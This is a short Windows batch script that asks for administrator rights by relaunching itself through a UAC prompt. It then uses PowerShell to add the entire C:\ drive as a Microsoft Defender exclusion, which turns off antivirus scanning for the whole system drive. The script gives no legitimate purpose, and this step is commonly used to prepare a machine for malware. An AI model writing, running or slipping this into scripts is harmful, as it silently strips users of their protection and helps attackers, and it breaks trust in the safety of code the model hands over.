@echo off
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit)
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
